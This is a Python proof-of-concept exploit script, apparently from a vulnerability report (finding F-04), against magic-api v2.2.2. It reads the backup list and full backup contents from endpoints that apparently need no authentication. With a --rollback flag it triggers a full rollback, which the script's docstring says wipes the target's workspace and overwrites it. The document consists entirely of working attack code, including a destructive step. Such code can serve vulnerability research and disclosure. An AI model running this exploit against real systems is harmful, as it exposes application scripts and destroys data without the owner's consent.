#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F-04: 未授权备份导出 + 全量回滚 (magic-api v2.2.2)

GET  /magic/web/backups             -> 备份列表 (无需认证)
GET  /magic/web/backup?ts=&id=      -> 备份内容 (完整脚本)
POST /magic/web/backup/rollback     -> 回滚: id=full 时 root.delete() 清空工作区再覆盖

破坏链: rollback(FULL) -> DefaultMagicResourceService.upload(full=true) -> 全删 + 写入历史/攻击者备份

用法:
  python3 poc_f04_backup.py http://target:9999            # 只读: 列表 + 详情
  python3 poc_f04_backup.py http://target:9999 --rollback # 破坏: 执行回滚
"""
import json
import sys
import urllib.request

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:9999'
WEB = f'{BASE}/magic/web'
ROLLBACK = '--rollback' in sys.argv


def get(url):
    return json.loads(urllib.request.urlopen(url, timeout=10).read())


def post(url, form):
    data = '&'.join(f'{k}={v}' for k, v in form.items()).encode()
    req = urllib.request.Request(url, data=data,
                                 headers={'Content-Type': 'application/x-www-form-urlencoded'})
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


backups = get(f'{WEB}/backups')
print('[+] /backups code:', backups.get('code'))
entries = backups.get('data') or []
print(f'[+] 备份条目: {len(entries)}')
if entries:
    e = entries[0]
    print('[+] 最新备份:', {k: e.get(k) for k in ('timestamp', 'id', 'name') if k in e})
    detail = get(f'{WEB}/backup?timestamp={e.get("timestamp")}&id={e.get("id","full")}')
    print('[+] /backup code:', detail.get('code'), '| 内容长度:', len(str(detail.get('data') or '')))

if ROLLBACK and entries:
    print('[!!!] 破坏性操作：回滚将清空当前工作区')
    r = post(f'{WEB}/backup/rollback', {'id': entries[0].get('id', 'full'), 'timestamp': entries[0].get('timestamp')})
    print('[+] rollback 响应:', r.get('code'), r.get('message'))
